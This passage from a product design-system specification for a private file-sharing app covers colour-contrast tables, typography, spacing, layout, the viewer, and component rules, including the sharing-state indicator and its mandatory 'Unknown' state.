**Light theme — state families.** `fg on tint` is the badge, chip, and banner case. `fg on
surface` is the icon-only and inline-text case. `on-solid on solid` is the filled badge and
filled button case. `solid on surface` establishes that a solid fill is itself a valid non-text
indicator.

| Family | fg on own tint | fg on surface | on-solid on solid | solid on surface | Verdict |
| --- | --- | --- | --- | --- | --- |
| `share-private` | 7.33 | 8.45 | 6.56 | 6.56 | AA all |
| `share-granted` | 8.70 | 10.24 | 7.84 | 7.84 | AA all |
| `share-link` | 6.60 | 7.34 | 5.36 | 5.36 | AA all |
| `share-unknown` | 7.17 | 8.32 | — | — | AA all |
| `state-expiring` | 6.88 | 7.85 | 5.95 | 5.95 | AA all |
| `state-password` | 8.28 | 9.60 | 7.76 | 7.76 | AA all |
| `state-expired` | 6.76 | 7.85 | — | — | AA all |
| `state-trashed` | 6.92 | 8.00 | — | — | AA all |
| `state-info` | 8.39 | 9.52 | 5.82 | 5.82 | AA all |
| `state-success` | 7.37 | 8.32 | 6.07 | 6.07 | AA all |
| `state-warning` | 6.60 | 7.34 | 5.36 | 5.36 | AA all |
| `state-danger` | 7.14 | 8.16 | 5.95 | 5.95 | AA all |
| `neutral-solid` | — | — | 15.69 | — | AAA |

**Dark theme — text**

| Foreground | canvas | surface | raised | sunken | Verdict |
| --- | --- | --- | --- | --- | --- |
| `--text-primary` #E8EBF0 | 15.95 | 14.77 | 13.70 | 16.39 | AAA |
| `--text-secondary` #A6AFBE | 8.62 | 7.98 | 7.40 | 8.86 | AAA |
| `--text-tertiary` #818B9B | 5.53 | 5.13 | 4.76 | 5.69 | **AA body on all four** |
| `--text-link` #77A8F5 | 7.90 | 7.32 | 6.79 | 8.12 | AAA |
| `--text-disabled` #5E6878 | 3.38 | 3.13 | 2.91 | 3.48 | Exempt |

**Dark theme — state families**

| Family | fg on own tint | fg on surface | on-solid on solid | solid on surface | Verdict |
| --- | --- | --- | --- | --- | --- |
| `share-private` | 8.09 | 8.85 | 5.36 | 5.50 | AA all |
| `share-granted` | 7.64 | 7.97 | 4.63 | 4.21 | AA all |
| `share-link` | 8.89 | 9.82 | 7.00 | 7.14 | AA all |
| `share-unknown` | 7.07 | 7.98 | — | — | AA all |
| `state-expiring` | 7.89 | 8.49 | 5.89 | 5.83 | AA all |
| `state-password` | 8.16 | 8.40 | 5.40 | 4.95 | AA all |
| `state-expired` | 6.06 | 6.85 | — | — | AA all |
| `state-trashed` | 7.48 | 7.84 | — | — | AA all |
| `state-info` | 7.76 | 8.72 | 4.68 | 4.37 | AA all |
| `state-success` | 8.36 | 9.60 | 5.68 | 5.84 | AA all |
| `state-warning` | 8.89 | 9.82 | 7.00 | 7.14 | AA all |
| `state-danger` | 7.19 | 7.70 | 4.91 | 4.77 | AA all |
| `neutral-solid` | — | — | 15.95 | — | AAA |

**Non-text.** `--border-strong` is the only border token permitted on a control boundary and
measures **3.66** (light, on surface) / **3.41** (dark, on surface) — AA non-text in both.
`--border-default` (1.43 light / 1.50 dark) and `--border-subtle` (1.24 / 1.22) are decorative
and may be used only where the component is *also* distinguished by a background change.
`--focus-ring-color` measures **5.82** against light surface and **7.32** against dark surface.
`--state-expired-border` measures 1.83 / 1.81 and is therefore always paired with the dashed
stroke *and* the tint, never used as a lone control boundary.

Two rules follow and are non-negotiable:

1. **An input's border is always `--border-strong`.** Never `--border-default`.
2. **`--border-default` is never the only thing distinguishing an interactive control from the
   page.**

Every value above is asserted in Part 14 by a token-level contrast test that reads
`tokens.json` and fails CI on regression, so a future colour change cannot quietly drop a pair
below threshold.

---

## 13.3 Typography

### 13.3.1 Stacks

```css
:root {
  --font-sans:
    "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
    "Helvetica Neue", Arial, "Noto Sans", sans-serif,
    "Apple Color Emoji", "Segoe UI Emoji";

  --font-mono:
    "JetBrains Mono", ui-monospace, SFMono-Regular, "SF Mono", Menlo,
    Consolas, "Liberation Mono", "Courier New", monospace;
}
```

**Inter** is the optional face, **self-hosted** from `/assets/fonts/inter-{400,500,600}.woff2`
with `font-display: swap`, subset to Latin + Latin-Ext, roughly 42 KB total. **JetBrains Mono**
is likewise optional and self-hosted (400, 500), roughly 30 KB. Its slashed zero and its
unambiguous `1` / `l` / `I` are the entire reason for choosing it: this product asks people to
read 22-character base58 share tokens and SHA-256 prefixes and decide whether two of them match.

**No Share surface ever references a font CDN.** Not `fonts.googleapis.com`, not
`fonts.gstatic.com`, not a self-hosted file on another origin. A font request from a
recipient-facing page (R1–R7) would tell a third party that a specific viewer, at a specific
time, opened a specific person's private link — precisely the leak this product exists to
close. The dashboard follows the same rule rather than maintaining two, because one rule
everywhere is easier to keep than two.

If either face fails to load, the system stack renders at close metrics and nothing shifts by
more than one line-height. Recipient-facing pages use **the system stack only** and never link a
font file at all (§13.11.4).

Enable `--font-features: "cv05" 1, "ss01" 1, "tnum" 1;` in numeric contexts only.
`font-variant-numeric: tabular-nums` is **mandatory** in every table cell containing a number,
every byte size, every duration, every count, and every timestamp.

### 13.3.2 Scale

Root is 16px. Sizes are given in px for clarity and authored in rem.

| Token | Size | Line height | Weight | Tracking | Used for |
| --- | --- | --- | --- | --- | --- |
| `--type-display` | 28px / 1.75rem | 34px (1.21) | 600 | -0.02em | Sign-in (11.1–11.2), passkey registration (11.3), invite acceptance (11.4), the empty-instance state, the R3 expired-link headline. Nowhere else. |
| `--type-h1` | 22px / 1.375rem | 28px (1.27) | 600 | -0.015em | The screen title in the page header. Exactly one per screen. |
| `--type-h2` | 18px / 1.125rem | 24px (1.33) | 600 | -0.01em | Section headings, dialog and drawer titles, card titles when the card is a page section. |
| `--type-h3` | 15px / 0.9375rem | 20px (1.33) | 600 | 0 | Card headers, form group legends, the viewer's filename, table group headers, stacked-row titles. |
| `--type-body` | 14px / 0.875rem | 20px (1.43) | 400 | 0 | **Default.** All UI text, table cells, form values, menu items, button labels. |
| `--type-body-lg` | 15px / 0.9375rem | 24px (1.6) | 400 | 0 | Help and agent-setup prose (11.27) and the body of banners. |
| `--type-sm` | 13px / 0.8125rem | 18px (1.38) | 400 | 0 | Helper text, field errors, secondary table cells, timestamps, breadcrumbs, captions. |
| `--type-xs` | 12px / 0.75rem | 16px (1.33) | 500 | 0.005em | Table column headers, badge and chip labels, tooltip body, avatar initials. |
| `--type-2xs` | 11px / 0.6875rem | 14px (1.27) | 500 | 0.01em | Chart axis labels and sparkline captions only. Never for anything anyone must act on. |

Weights available: **400 regular, 500 medium, 600 semibold**. There is no 700 and no italic
anywhere in the product chrome. (Help prose may use italic for the single purpose of marking a
term on first use.) Emphasis inside body text is 500 — never 600, never italic.

Table column headers are `--type-xs`, weight 500, `--text-tertiary`, **sentence case, not
uppercase**. Uppercase headers cost legibility at 12px and buy nothing at this density.

### 13.3.3 Monospace scale

| Token | Size | Line height | Weight | Used for |
| --- | --- | --- | --- | --- |
| `--type-mono` | 13px | 20px | 400 | Inline identifiers in body context: artifact names, paths, IDs, URLs. |
| `--type-mono-sm` | 12px | 18px | 400 | Identifiers inside chips, table cells at compact density, breadcrumb segments, file-tree rows. |
| `--type-mono-code` | 13px | 20px | 400 | Code blocks (§13.6.19), the agent-setup snippets, the manifest view. |
| `--type-mono-lg` | 18px | 24px | 500 | A share token or generated password in a "shown once" copy field (§13.6.20.3), and the artifact name in the 11.7 page header. |

### 13.3.4 The monospace rule

**Artifact names, share tokens, and IDs are ALWAYS monospace. There is no exception, including
inside headings**, where they render at the heading's size in `--font-mono` at weight 500.

Monospace, always:

- **Artifact names** — `postcal`, `q3/market-report` — in the list, in the header, in a
  breadcrumb, in a dialog sentence, in a toast, in an email.
- **Share tokens and share URLs** — `9fq2n4kwPz3mXr7bTvQ8dL`, `share.c52.com/s/9fq2n4kw…`.
- **Generated and owner-supplied link passwords** — `civil-marmot-71`.
- All prefixed IDs from §3: `art_`, `ver_`, `fil_`, `lnk_`, `grt_`, `tok_`, `usr_`, `pky_`,
  `ses_`, `aud_`.
- **API tokens** and their `shr_` prefix, including the masked form `shr_…4f2a`.
- SHA-256 file hashes and their 7-character display prefixes.
- File and directory paths, including in the file tree and the file listing (R7).
- Handles (`~sarah`) and every URL in the product.
- MIME types, HTTP methods, status codes, header names, error codes (`link_expired`), scope
  names (`share:create`), and duration strings (`14d`).

Proportional, always: artifact **titles**, person names, tag labels, descriptions, link labels,
prose, error sentences, dates and times, counts, byte sizes in tables.

The reason is falsifiability. Someone checking that the token in an email matches the one in the
dashboard needs a character-by-character scan, and a proportional font makes `rn` and `m` the
same shape. This product asks people to trust identifiers, so it has to make them readable.

A name and its title frequently sit together. The name leads, monospace, `--text-primary`; the
title follows on the same line at `--type-sm` `--text-tertiary`, proportional, truncated with
CSS if it must be:

```
postcal   Q4 posting calendar
```

Never the other way round. The name is the address; the title is a courtesy.

---

## 13.4 Spacing, sizing, radius, elevation

### 13.4.1 Spacing scale

Base unit **4px**. Every margin, padding, and gap in the product is one of these values.

```css
--space-0:   0;
--space-px:  1px;
--space-05:  2px;
--space-1:   4px;
--space-15:  6px;
--space-2:   8px;
--space-3:  12px;
--space-4:  16px;
--space-5:  20px;
--space-6:  24px;
--space-8:  32px;
--space-10: 40px;
--space-12: 48px;
--space-16: 64px;
--space-20: 80px;
```

**The rhythm rule:** all vertical spacing is a multiple of 4px. The only permitted
non-multiples are 1px borders, the 2px focus offset, and the 6px step (`--space-15`), which
exists solely for horizontal padding inside small controls and for the gap between an icon and
its label. If a layout seems to need 14px or 18px, the layout is wrong; pick 12px, 16px, or
20px.

| Context | Value |
| --- | --- |
| Icon → label gap | `--space-15` (6px) |
| Between related controls in a row | `--space-2` (8px) |
| Between a sharing-state badge and its sibling chips | `--space-15` (6px) |
| Form field → its helper or error text | `--space-15` (6px) |
| Between form fields | `--space-4` (16px) |
| Between form groups | `--space-6` (24px) |
| Card padding | `--space-4` (16px); `--space-6` when the card is a page section |
| Dialog and drawer padding | `--space-6` (24px) |
| Between page sections | `--space-8` (32px) |
| Page gutter (desktop) | `--space-6` (24px) |
| Viewer mat inset around artifact content | `--space-6` (24px), `--space-4` below 768px |

### 13.4.2 Control heights

| Token | Height | Font | Horizontal padding | Used by |
| --- | --- | --- | --- | --- |
| `--control-xs` | 24px | `--type-xs` | 8px | Chips, badges, table row actions, tag inputs |
| `--control-sm` | 28px | `--type-sm` | 10px | Toolbar buttons, filters, compact-density inputs, pagination, viewer bar controls |
| `--control-md` | 32px | `--type-body` | 12px | **Default.** Buttons, inputs, selects, dropdown triggers |
| `--control-lg` | 40px | `--type-body` | 16px | The primary action on sign-in, the confirm in the create-link dialog (11.13), the R1 unlock button, mobile controls |

Icon-only buttons are square at their control height: 24 / 28 / 32 / 40. Minimum touch target
below 768px is 44×44 — small controls keep their visual size and gain invisible padding through
a `::before` overlay.

Row heights: **table row 40px** (comfortable, the default), **32px** (compact), **56px** for
list rows carrying a thumbnail plus two lines (the artifact list at 11.5 on narrow viewports).
Sidebar nav item 32px. Menu item 32px. Tab 36px. File-tree row 28px.

### 13.4.3 Radii

```css
--radius-xs:   3px;    /* checkbox, inline code */
--radius-sm:   4px;    /* badges, chips, code blocks, thumbnails, table inner corners */
--radius-md:   6px;    /* DEFAULT: buttons, inputs, selects, menu items */
--radius-lg:   8px;    /* cards, panels, banners, toasts, dropdown surfaces */
--radius-xl:  12px;    /* dialogs, drawers (leading edge only) */
--radius-full: 9999px; /* avatars, toggle track and thumb, the state dot */
```

Badges use `--radius-sm`, never `--radius-full`. A pill-shaped status badge reads as consumer
UI; a 4px chip reads as data.

### 13.4.4 Elevation

Four levels. Declared on bare `:root` in §13.2.4 with the dark overrides in the same block.

| Level | Applied to |
| --- | --- |
| flat — no shadow, 1px `--border-default` | Cards, tables, panels, the sidebar, the viewer bar |
| `--shadow-sm` | Sticky table header once scrolled, sticky page header |
| `--shadow-md` | Dropdown menus, popovers, tooltips, toasts, the command palette |
| `--shadow-lg` | Dialogs, drawers |

Cards have no shadow at rest and never gain one on hover. Hover on an interactive card changes
`--bg-surface` → `--bg-hover` and `--border-default` → `--border-strong`. Nothing in this
product lifts, scales, or floats on hover.

### 13.4.5 Z-index scale

```css
--z-base: 0;      --z-sticky: 10;   --z-sidebar: 20;   --z-viewer-bar: 30;
--z-dropdown: 100; --z-tooltip: 200; --z-drawer: 300;
--z-overlay: 400;  --z-dialog: 401;  --z-toast: 500;
```

Nothing in the product uses a z-index outside this scale. An artifact rendered in an `iframe`
sits at `--z-base` and can never raise itself above the viewer bar, because the `iframe` is
sandboxed and its stacking context is the frame, not the page.

---

## 13.5 Layout

### 13.5.1 The app shell

```
┌──────────────────────────────────────────────────────────────────────┐
│  Top bar  52px                                                       │
├──────────────┬───────────────────────────────────────────────────────┤
│              │  Page header                                          │
│  Sidebar     │  h1 (mono name) + sharing state + actions             │
│  240px       │───────────────────────────────────────────────────────│
│              │  Content region                                       │
│              │  max-width 1240px (data) / 720px (prose, forms)       │
│              │  gutter 24px                                          │
└──────────────┴───────────────────────────────────────────────────────┘
```

| Element | Spec |
| --- | --- |
| Sidebar | 240px expanded, 56px icon rail collapsed. `--bg-surface`, 1px right border `--border-subtle`. Collapse state persists in `localStorage` under `share.sidebar`. |
| Top bar | 52px. `--bg-surface`, 1px bottom border `--border-subtle`, sticky at `--z-sticky`. Contains, left to right: the space switcher (own space / shared with me), the search trigger with a `⌘K` hint, an upload button, the theme control, help, and the avatar menu. |
| Page header | Not a separate bar; it sits inside the content region with 24px top padding. Contains the `--type-h1` title, the sharing-state indicator when the screen represents one artifact, and up to three actions right-aligned. |
| Content max-width | **1240px** for tables, the artifact list, the files tab, storage, audit. **720px** for help prose, settings forms, and any single-column form. Centred with `margin-inline: auto` past the max. |
| Page gutter | 24px ≥1024px; 16px 640–1023px; 12px <640px. |
| Footer | None. Instance version and a link to 11.28 live in the sidebar foot at `--type-sm` `--text-tertiary`. |

Sidebar groups, top to bottom: **artifacts** (Artifacts, Shared with me, Trash), **account**
(Tokens, Security, Storage, Settings), and, for the root user only, **instance** (Users, Audit,
Status). The active item uses `--bg-selected`, `--text-primary`, and a 2px inset left bar in
`--text-link`.

The sidebar carries no per-artifact state indicators and no counts other than a trash count,
because a permanently visible tally of live links would become wallpaper. Links needing
attention surface as the expiring-soon banner on 11.5 instead (§13.6.16).

### 13.5.2 Breakpoints

```css
--bp-sm:  640px;  --bp-md:  768px;  --bp-lg: 1024px;
--bp-xl: 1280px;  --bp-2xl: 1536px;
```

| Breakpoint | What changes |
| --- | --- |
| **≥1536px** | The content region stays at its max-width; extra space becomes gutter. Nothing stretches. The viewer is the sole exception and always fills the viewport. |
| **≥1280px** | The files tab (11.8) shows the file tree (240px) and the preview side by side. The sharing panel (11.12) shows links and grants in two columns. |
| **1024–1279px** | The file tree collapses to a toggle. The sharing panel stacks to one column. Tables drop their `priority=3` columns (marked per table in Part 11). |
| **768–1023px** | The sidebar becomes an overlay drawer behind a hamburger in the top bar; content takes the full width. Page-header actions beyond the first collapse into an overflow `⋯` menu. Tables drop `priority=2` columns. |
| **640–767px** | Tables become stacked rows (§13.5.3). Dialogs go to `calc(100vw - 32px)`. Tabs become horizontally scrollable with edge fades. The viewer bar loses its filename and keeps its controls. |
| **<640px** | Dialogs become full-screen sheets with a sticky footer. Drawers become bottom sheets at 90vh. The command palette is full-screen. Two-column forms become one column. The viewer's page gutter drops to 0 and the artifact fills the width. |

The dashboard is fully usable at 375px. It is not *optimised* for phones — this is an
operator's tool — but every action, including creating and revoking a share link, must be
reachable there, because the moment someone needs to kill a link is rarely the moment they are
at a desk.

### 13.5.3 Table density and column rules

**Density** is a per-user preference persisted in `localStorage` under `share.density`, with
values `comfortable` (default, 40px rows, `--type-body`) and `compact` (32px rows, `--type-sm`,
identifiers drop to `--type-mono-sm`, thumbnails drop from 32px to 20px). The control is a
two-state segmented control in the table toolbar, not buried in settings. Density never changes
which columns are present — only heights and font sizes.

Column rules, applied to every table in the product:

1. **Column 1 is identity** — the artifact name (monospace) with its title beneath or beside it,
   preceded by a 32px kind thumbnail (§13.6.28). Sticky-left at ≥1024px. Never truncated below
   200px of content; if space is short, other columns truncate first.
2. **Column 2 is the sharing-state indicator** on every table whose rows are artifacts. It never
   truncates, never collapses into an overflow menu, and never drops at any breakpoint. If the
   viewport cannot fit columns 1 and 2 together, the table becomes stacked rows rather than
   dropping the state.
3. **Numeric columns are right-aligned** with `tabular-nums`. Text columns are left-aligned.
   There is no centre alignment in any table in this product.
4. **Timestamps are the last data column**, `--type-sm`, `--text-tertiary`.
5. **Row actions** are a trailing 40px column holding one `⋯` icon button, revealed on row hover
   and on keyboard focus, and always present on coarse pointers (`@media (pointer: coarse)`).
6. Row hover is `--bg-hover`. The whole row is a link target when the row has a canonical
   destination, with the anchor wrapping column 1 and a full-row `::after` hit area.
7. **No zebra striping.** Rows are separated by a 1px `--border-subtle` rule.

**Stacked rows** (<768px): each row becomes a card at `--radius-lg` with the kind thumbnail and
the monospace name as its title at `--type-h3`, **the sharing-state indicator directly beneath
the title**, the title text and remaining columns as `label: value` pairs at `--type-sm`, and
the `⋯` menu at the card's top-right.

### 13.5.4 The viewer: full-bleed layout

Screen 11.9 renders an artifact. It is the only screen in the product that abandons the app
shell, and it does so because of D3: the artifact is the content, and a sidebar next to
somebody's carefully composed report is the design system talking over it.

```
┌──────────────────────────────────────────────────────────────────────┐
│ ← postcal · index.html      [🔒 Private]        ⤓  ⧉  ⋯      ✕      │  48px viewer bar
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│                    ┌────────────────────────────┐                    │
│                    │                            │                    │  --bg-viewer mat
│                    │     rendered artifact      │                    │
│                    │                            │                    │
│                    └────────────────────────────┘                    │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

| Element | Spec |
| --- | --- |
| Viewer bar | 48px, `--bg-surface`, 1px bottom `--border-subtle`, `--z-viewer-bar`, never translucent and never overlaying content. Left: a 28px ghost back button, the monospace artifact name, a `·` separator, and the current filename at `--type-sm` `--text-tertiary`. Centre: the sharing-state indicator at `sm` / `subtle`. Right: download, open-in-new-tab, `⋯`, and close, all 28px ghost icon buttons. |
| Mat | `--bg-viewer` fills the remaining viewport. The artifact is centred with 24px inset. The mat is the only surface in the product that is neither canvas nor surface, and it exists so a white PDF page and a transparent PNG both have an edge. |
| Kind: `page`, `bundle` | Rendered in an `<iframe sandbox="allow-scripts allow-forms allow-popups allow-downloads" referrerpolicy="no-referrer">` filling the mat edge to edge with **no inset and no radius** — a bundle is a whole page and must not look framed. No dashboard stylesheet is injected. |
| Kind: `document` (PDF) | The browser's native PDF viewer in an `<object>`, centred, `max-width: 1000px`, full mat height. No custom PDF chrome, no page thumbnails, no in-house renderer. |
| Kind: `image` | Centred, `max-width: min(100%, natural width)`, `max-height: 100%`, `object-fit: contain`, `--radius-sm`, `--shadow-sm`. Click toggles between fit-to-window and 100%; the cursor becomes `zoom-in` / `zoom-out`. A checkerboard is **not** used behind transparency — the mat is enough, and a checkerboard is chrome competing with content. |
| Kind: `video` | A native `<video controls preload="metadata" playsinline>` centred at `max-width: 1280px`. No custom player, no autoplay, no generated poster frame — Share never opens the file (P5), so there is no thumbnail to generate. |
| Kind: `file` | No viewer. The mat holds a centred empty-state-shaped block: the kind icon, the filename in monospace, the byte size, and one `primary` Download button. |
| Chrome timeout | The viewer bar is **always visible**. It does not auto-hide, fade on idle, or reveal on mouse-move. Somebody reading a document for ten minutes should never have to hunt for the way out, and an auto-hiding bar that carries the sharing state would hide the sharing state. |

Keyboard: `Escape` returns to the artifact detail screen, `←` / `→` move between files in a
bundle when the file tree is open, `f` toggles browser fullscreen, `d` downloads. All four are
listed in the `⋯` menu so they are discoverable.

The recipient-facing equivalents (R2, R7) reuse the mat and the kind rules exactly, with a
viewer bar reduced to the artifact's title if one is set, a download button, and nothing else —
no name, no handle, no state indicator, per §7.6.

---

## 13.6 Component specifications

Every component below shares these state definitions unless it overrides them explicitly:

| State | Rule |
| --- | --- |
| **hover** | Background and border step one level (`--bg-surface` → `--bg-hover`, `--border-default` → `--border-strong`). Nothing scales, lifts, or gains a shadow. |
| **active** (pressed) | One further background step (`--bg-active`). No transform. |
| **focus** | `outline: var(--focus-ring-width) solid var(--focus-ring-color); outline-offset: var(--focus-ring-offset);` applied through `:focus-visible` only. `outline: none` without an equally visible replacement is a spec violation. |
| **disabled** | `opacity: 1` — never faded — with `background: var(--bg-sunken)`, `color: var(--text-disabled)`, `border-color: var(--border-default)`, `cursor: not-allowed`, `aria-disabled="true"`. Disabled controls stay focusable so a screen reader can find them; they do not respond to activation. |
| **loading** | The control keeps its exact width, measured before the swap. The label is replaced by a 14px spinner plus the present-tense verb ("Creating link…"). `aria-busy="true"`, non-interactive. Never a layout shift. |

### 13.6.1 Button

**Anatomy:** `[leading icon 16px] [label] [trailing icon 16px]`, 6px gaps, centred. Icons are
optional. A button never carries both a leading and a trailing icon, except the split-button
trigger.

| Variant | Rest | Hover | Active | Use |
| --- | --- | --- | --- | --- |
| `primary` | bg `--neutral-solid`, text `--neutral-solid-text`, no border | bg `--neutral-solid-hover` | bg `--neutral-solid-active` | The one main action per view. At most one per page header and one per dialog footer. |
| `secondary` | bg `--bg-surface`, text `--text-primary`, 1px `--border-strong` | bg `--bg-hover` | bg `--bg-active` | Everything else. The default choice. |
| `ghost` | transparent, text `--text-secondary`, no border | bg `--bg-hover`, text `--text-primary` | bg `--bg-active` | Icon buttons, toolbar actions, row actions, dialog dismiss, viewer-bar controls. |
| `danger` | bg `--state-danger-solid`, text `--state-danger-on-solid` | bg `--state-danger-hover` | 90% luminance of hover | Only the confirming action of a destructive dialog and the danger-zone buttons on 11.21. Never in a toolbar. |
| `danger-ghost` | transparent, text `--state-danger-fg` | bg `--state-danger-bg` | — | The menu item or row action that *opens* a destructive dialog. |

There is no brand-coloured primary button. The create-link dialog's confirm (11.13) is
`primary` — graphite — with a leading `link-2` icon. **Amber lives in the badge and in the
warning banner inside that dialog, never in the button**, so amber never becomes a
click-target colour and never competes with the state it is supposed to describe.

**Revoke** is a `secondary` button, not a `danger` one, everywhere it appears. Killing a live
link is the safe direction (D5) and must not be dressed as dangerous; treating it as scary is
how links stay alive longer than they should.

**Sizes:** `sm` 28px, `md` 32px (default), `lg` 40px. Radius `--radius-md`. Font `--type-body`
weight 500 — not 600; buttons are not headings.

**Split button** ("Share ▾" on 11.7): a `primary` segment, a 1px divider in
`rgba(255,255,255,0.24)`, then a 28px chevron segment opening a dropdown.

**Full-width** only in dialogs below 640px, on the sign-in screens, and on R1.

### 13.6.2 Input

**Anatomy:** `[label] [input [leading icon] [value] [trailing affix or action]] [helper or error]`

Label: `--type-sm`, weight 500, `--text-secondary`, 6px above the field. Required fields carry
no asterisk; optional fields are labelled `(optional)` — most fields here are required, and
marking the minority is quieter.

| State | Spec |
| --- | --- |
| default | 32px tall, bg `--bg-surface`, 1px `--border-strong`, `--radius-md`, padding-inline 10px, `--type-body`, `--text-primary` |
| placeholder | `--text-tertiary`. Placeholders are examples, never instructions, and never repeat the label. |
| hover | border `--text-tertiary` |
| focus | border `--border-focus` plus the focus ring |
| disabled | bg `--bg-sunken`, text `--text-disabled` |
| read-only | bg `--bg-sunken`, border `--border-default`, text `--text-primary`, selectable, always with a copy control |
| invalid | border `--state-danger-solid`, `aria-invalid="true"`, `aria-describedby` pointing at the error id |
| loading | a trailing 14px spinner replacing any trailing affix |

**Affixes** render inside the field in `--font-mono` `--text-tertiary`, separated by a 1px
`--border-subtle` divider with 10px padding. The name field on 11.21 and 11.17 uses a leading
affix of `share.c52.com/` so the address being built is visible as it is typed.

**Monospace inputs:** any input whose value is an identifier — artifact name, tag, handle,
token label, password, recovery code, path — uses `--font-mono` with `autocapitalize="off"`,
`autocorrect="off"`, `spellcheck="false"`.

**Password input** (R1, and the custom-password field in 11.13): `type="password"` with a
trailing 24px ghost `eye` / `eye-off` toggle whose `aria-label` is "Show password" /
"Hide password". The toggle is a real `<button type="button">` so it never submits the form. On
R1, where there is no JavaScript, the toggle is **omitted entirely** rather than rendered
inert.

**Recovery-code entry** (11.2): six 40×48px cells, `--type-mono-lg`, centred, auto-advancing,
paste-aware, `autocomplete="one-time-code"`. It degrades to one plain text input when
JavaScript does not run; the split-cell form is the progressive enhancement.

### 13.6.3 Select

Native `<select>` everywhere except multi-select and the space switcher. Styled to match Input
exactly — 32px, `--border-strong`, `--radius-md`, `appearance: none` — with a 16px
`chevron-down` in `--text-tertiary` 10px from the right edge. Options render at OS default.

A custom listbox is used only where options need an icon or a description: the TTL picker in
11.13, the kind filter on 11.5, and the space switcher. Surface `--bg-raised`, `--radius-lg`,
`--shadow-md`, 4px padding, items 32px with a 16px leading icon and a trailing `check` on the
selected item, `max-height: 320px` then scroll.

**The TTL picker never offers a "never" option.** Its values are `30m`, `24h`, `7d`, `14d`
(default), `30d`, `90d`, `180d`, rendered as `14 days — expires 7 Sep 2026, 18:04` so the
consequence is visible before the choice is made. There is no custom-date input and no
"permanent" affordance anywhere in the UI, because P4 has no exception and a disabled option
labelled "Never" would suggest one exists.

### 13.6.4 Textarea

Same tokens as Input. `min-height: 72px` (3 rows), padding `8px 10px`, `line-height: 20px`,
`resize: vertical`, auto-growing to 240px then scrolling. A character counter — `--type-xs`,
`--text-tertiary`, bottom-right, *outside* the field — appears only on fields with a hard limit
(the link `label` field, 120 characters; the artifact `description` field, 500) and only past
80% of it. At 100% it turns `--state-danger-fg`.

### 13.6.5 Checkbox and radio

A 16×16px control — `--radius-xs` for a checkbox, `--radius-full` for a radio — 1px
`--border-strong` on `--bg-surface`. Checked: background `--neutral-solid`, mark
`--neutral-solid-text` (a 10px `check`, or a 6px dot for a radio). Indeterminate: an 8×2px bar.
Hover: border `--text-tertiary`. Focus: the ring on the control itself.

Label `--type-body` `--text-primary`, 8px gap, clickable, `align-items: flex-start` so a
multi-line label aligns to its first line. Helper text sits beneath at `--type-sm`
`--text-tertiary`, indented to the label's left edge.

**Checkboxes never carry semantic colour.** There is no green checkbox and no amber checkbox in
this product.

### 13.6.6 Toggle

Track 32×18px at `--radius-full`; thumb a 14px circle at `--radius-full`, 2px inset,
`--shadow-xs`. Off: track `--border-strong`. On: track `--neutral-solid`. Disabled: track
`--border-default`. Transition: thumb `transform` 120ms `--ease-standard`, track
`background-color` 120ms.

**Toggles are for preferences that take effect immediately and are individually reversible** —
email notifications, "notify me when a link is created", theme, density, pinning an artifact.

**A toggle never changes an artifact's sharing state.** Not to create a link, not to revoke
one, not to add a password, not to grant to a user. Those are objects you create, list, and
revoke (§1.7, principle 2) and they get dialogs and buttons with verbs. A toggle wired to
`POST /links` is a spec violation, and reviewers should treat one as they would a missing
authorisation check.

### 13.6.7 Badge

A **badge** is a read-only state label. A **chip** is a badge that can be dismissed or that
filters (§13.6.22).

Anatomy: `[icon 12px] [label]`, 4px gap, height 20px (`sm`) or 24px (`md`), padding-inline 6px
(sm) / 8px (md), `--radius-sm`, `--type-xs` weight 500. Never `--radius-full`.

| Variant | Spec |
| --- | --- |
| `subtle` | bg `--{family}-bg`, 1px `--{family}-border`, text `--{family}-fg`. **The default everywhere.** |
| `solid` | bg `--{family}-solid`, no border, text `--{family}-on-solid`. Reserved for the sharing-state indicator in a page header and inside the create-link dialog's result state. |
| `outline` | transparent, 1px `--border-default`, text `--text-secondary`. Counts, version numbers, `v3`, `+2 more`. |

### 13.6.8 The sharing-state indicator

This is the most important component in the product. It appears on at least twelve surfaces and
must be pixel-identical on all of them. It is implemented **once**, exported once, and may not
be re-implemented inline anywhere — a second implementation is how two screens end up
disagreeing about who can see something.

#### 13.6.8.1 Values

There are exactly **four** values: the three derived states from §7.8, plus `unknown`. There is
no fifth.

| Value | API `visibility` | Family | Icon (Lucide) | Label — verbatim |
| --- | --- | --- | --- | --- |
| `private` | `private` | `--share-private-*` | `lock` | `Private` |
| `granted` | `granted` | `--share-granted-*` | `users` | `Shared with 3 people` — always the count, pluralised (`Shared with 1 person`) |
| `link` | `shared` | `--share-link-*` | `link-2` | `Link active` — or `2 links active` when more than one |
| `unknown` | *absent, stale, or failed* | `--share-unknown-*` | `circle-help` | `Unknown` |

The label is never abbreviated, never swapped for another word, and never localised into a
synonym. It is never "Public", "Live", "Published", "Open", "Draft", "Internal", "Visible", or
"Off". Per §12.2 those words do not exist in this product: nothing here is *public*, because
even a live link is a capability held by whoever has it, not an open door, and calling it
public would misdescribe the guarantee.

When `granted` and `link` are both true, **`link` wins** (§7.8) — a live bearer token is the
widest thing true about the artifact, and the owner should see the widest thing first. The
grant count then moves into the indicator's `aria-label` and into the artifact's sharing panel;
it is never dropped silently.

#### 13.6.8.2 The mandatory `unknown` state

`unknown` renders whenever the sharing state has not loaded, when the request that would have
supplied it failed, when a list was served from a stale cache, or when the client holds a
record whose `visibility` field is missing or unrecognised.

**The indicator never optimistically renders `Private`.** Guessing "Private" for an artifact
that in fact has a live link is the single worst failure this component can produce: it is a
silent, confident, wrong claim about who can see somebody's client work. Absence of data is
therefore shown as absence of data, in grey, with a question-mark icon and the word "Unknown".

Consequences, all mandatory:

- `unknown` is **never a skeleton**. While the row is loading the indicator renders `unknown` at
  the correct size, so the layout never shifts and no false state is ever shown even for one
  frame.
- `unknown` **suppresses every action that depends on state.** The "Create link" button, the
  "Revoke" button, and the share split-button render disabled with the tooltip "Sharing state
  unavailable. Reload to continue."
- `unknown` **suppresses the sibling chips.** No expiry chip, no password chip — we do not know
  whether there is a link, so we cannot claim anything about its expiry.
- A component that receives no `visibility` prop at all **throws in development and renders
  `unknown` in production**. It must not default to `private` in its prop defaults, and Part 14
  asserts this with a test that mounts the component with an empty object.
- A rendering of `unknown` that lasts more than 10 seconds swaps its tooltip to include a
  "Try again" affordance in the containing view's toolbar, not in the indicator, which is never
  interactive.

